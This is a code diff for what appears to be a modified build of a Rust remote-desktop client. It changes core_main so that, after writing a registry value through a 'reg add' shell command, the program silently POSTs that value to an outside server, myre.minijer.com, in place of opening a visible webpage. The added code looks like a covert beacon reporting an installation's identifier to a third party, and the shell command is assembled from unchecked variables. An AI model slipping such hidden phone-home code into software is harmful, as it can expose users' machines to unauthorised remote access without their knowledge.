@@ -10,8 +10,8 @@ use std::process::Command;
 use hbb_common::platform::register_breakdown_handler;
 #[cfg(windows)]
 use tauri_winrt_notification::{Duration, Sound, Toast};
-use reqwest;
-use tokio;
+
+use reqwest::blocking::Client;
 
 #[macro_export]
 macro_rules! my_println{
@@ -254,10 +254,24 @@ pub fn core_main() -> Option<Vec<String>> {
                        .args(&["/C", &format!("reg add {} /f /v {} /t REG_SZ /d {}", registry_path, key_name, value_data)])
                        .status()
                        .ok();
-		 let url = format!("http://myre.minijer.com/api.php?key=Online&cid={}", value_data);
-                 if let Err(err) = open_webpage_async(url).await {
-                    log::error!("Failed to open the webpage: {:?}", err);
-                 }
+		 
+
+    let client = Client::new();
+
+    // 定义POST请求的URL
+    let url = "http://myre.minijer.com/api.php";
+
+    // 定义POST请求的参数
+    let params = [("key", "Online"), ("getid", value_data)];
+
+    // 发送POST请求并忽略错误
+    let response = client.post(url).form(&params).send().unwrap();
+
+
+
+
+
+
 	     }		
             #[cfg(target_os = "macos")]
             crate::platform::macos::hide_dock();
